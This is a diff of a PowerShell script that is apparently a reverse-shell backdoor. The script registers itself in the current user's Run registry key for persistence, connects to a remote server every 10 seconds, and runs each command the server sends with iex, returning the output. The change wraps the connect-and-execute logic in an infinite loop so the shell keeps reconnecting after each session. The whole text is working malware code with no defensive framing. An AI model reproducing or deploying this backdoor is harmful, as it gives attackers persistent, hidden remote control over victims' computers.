@@ -12,37 +12,39 @@ if (-not (Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run).
     New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
 }
 
-# Try to connect to server every 10s
-do {
-	try {
-		$client = New-Object System.Net.Sockets.TcpClient($address, $port)
-	}
-	catch {
-		Start-Sleep -s 10
-	}
-} while (-not $client)
+while ($true) {
+	# Try to connect to server every 10s
+	do {
+		try {
+			$client = New-Object System.Net.Sockets.TcpClient($address, $port)
+		}
+		catch {
+			Start-Sleep -s 10
+		}
+	} while (-not $client)
 
-$stream = $client.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
-$reader = New-Object System.IO.StreamReader($stream)
+	$stream = $client.GetStream()
+	$writer = New-Object System.IO.StreamWriter($stream)
+	$reader = New-Object System.IO.StreamReader($stream)
 
-# Execute commands sent by the server, and return output
-do {
-	$cmd = $reader.ReadLine()
-	if ($cmd -eq 'bye') {
-		break
-	}
-	try {
-		$output = [string](iex $cmd)
-	}
-	catch {
-		$output = $_.Exception.Message
-	}
-	$writer.WriteLine($output)
-	$writer.Flush()
-} while($true)
+	# Execute commands sent by the server, and return output
+	do {
+		$cmd = $reader.ReadLine()
+		if ($cmd -eq 'bye') {
+			break
+		}
+		try {
+			$output = [string](iex $cmd)
+		}
+		catch {
+			$output = $_.Exception.Message
+		}
+		$writer.WriteLine($output)
+		$writer.Flush()
+	} while($true)
 
-# Cleanup
-$reader.Close()
-$writer.Close()
-$client.Close()
+	# Cleanup
+	$reader.Close()
+	$writer.Close()
+	$client.Close()
+}
